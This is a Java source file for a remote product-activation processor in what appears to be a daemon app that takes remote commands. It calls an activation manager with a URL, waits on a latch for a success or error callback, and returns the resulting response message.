package com.fx.maind.command.processor;

import java.util.concurrent.CountDownLatch;

import com.fx.maind.ref.ActivationResponse;
import com.fx.maind.ref.Customization;
import com.vvt.activation_manager.ActivationListener;
import com.vvt.activation_manager.ActivationManager;
import com.vvt.daemon.appengine.AppEngine;
import com.vvt.datadeliverymanager.enums.ErrorResponseType;
import com.vvt.logger.FxLog;
import com.vvt.remotecommandmanager.MessageManager;

public class RemoteActivateProductProcessor {
	private final static String TAG = "RemoteActivateProductProcessor";
	private static final boolean LOGV = Customization.VERBOSE;
	private static final boolean LOGE = Customization.ERROR;
	
	private ActivationResponse mResponse;
	private AppEngine mAppEngine;
	private CountDownLatch mWaitForResponseLatch;
	private String mActivationUrl;
	
	private ActivationListener mActivationListener = new ActivationListener() {
		@Override
		public void onSuccess() {
			mResponse.setSuccess(true);
			mResponse.setMessage(MessageManager.ACTIVATE_SUCCESS);
			
			mWaitForResponseLatch.countDown();
		}
		@Override
		public void onError(ErrorResponseType errorType, int code, String msg) {
			if(msg == null) {
				msg = MessageManager.getErrorMessage(code);
			}
			
			mResponse.setSuccess(false);
			mResponse.setMessage(msg);
			
			mWaitForResponseLatch.countDown(); 
		}
	};

	public RemoteActivateProductProcessor(AppEngine appEngine, String activationUrl) {
		mActivationUrl = activationUrl;
		mAppEngine = appEngine;
		mResponse = new ActivationResponse();
	}
	
	public ActivationResponse process() {
		
		if (LOGV) FxLog.v(TAG, "process # ENTER ...");
		
		if (LOGV) FxLog.v(TAG, String.format("process # Activation Url: %s", mActivationUrl));
		mWaitForResponseLatch = new CountDownLatch(1);
		
		ActivationManager activationManager = mAppEngine.getActivationManager();
		try {
			activationManager.autoActivate(mActivationUrl, mActivationListener);
		
			//Block the thread and wait till onSuccess or onError called.
			mWaitForResponseLatch.await(); 
		}		
		catch (Throwable e) {
			if (LOGE) FxLog.e(TAG, e.toString());
			mResponse.setSuccess(false);
			mResponse.setMessage(MessageManager.DEACTIVATE_ERROR);
		}
		
		if (LOGV) FxLog.v(TAG, "process # EXIT ...");
		
		return mResponse;
	}

}
